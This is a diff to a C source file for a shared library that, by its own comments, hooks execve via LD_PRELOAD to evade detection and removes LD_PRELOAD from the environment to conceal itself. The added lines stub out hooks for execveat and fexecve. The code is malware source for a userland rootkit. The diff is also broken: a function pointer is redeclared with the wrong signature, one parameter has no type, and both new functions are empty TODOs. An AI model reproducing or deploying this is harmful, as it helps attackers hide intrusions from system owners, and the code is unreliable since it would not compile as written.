@@ -2,7 +2,8 @@
 /*
 *@@@ landy @@@
 *Hooks execve and breaks static compiling. So far has basic features
-*that will hide from detection methods
+*that will hide from detection methods.
+*Also tries to hook some other system calls that may be used in place of execve
 *
 *gcc -o h00kExec.so -shared -fpic -ldl -Wl,-init,init h00kExec.c
 *
@@ -17,8 +18,13 @@
 //grabs the env variables at linking time(?)
 extern char **environ;
 
-//sets the old execve
+//sets the old functions for use later
 int (*old_execve)(const char *filename, char *const argv[], char *const envp[]);
+int (*old_execve)(int dirfd, const char *pathname, char *const argv[], char *const envp[], int flags);
+int (*old_fexecve)(int fd, char *const argv[], char *const envp[]);
+
+
+
 char *mypreload;
 
 //used to remove LD_PRELOAD when the library is loaded. We will load it back in 
@@ -95,4 +101,12 @@ int execve(const char *filename, char *const argv[], char *const envp[]){
 	}
 
 	return old_execve(filename, argv, newenvp);
+}
+
+int execveat(int dirfd, const char *pathname, char *const argv[], char *const envp[], int flags){
+    //TODO
+}
+
+int fexecve(fd, char *const argv[], char *const envp[]){
+    //TODO
 }
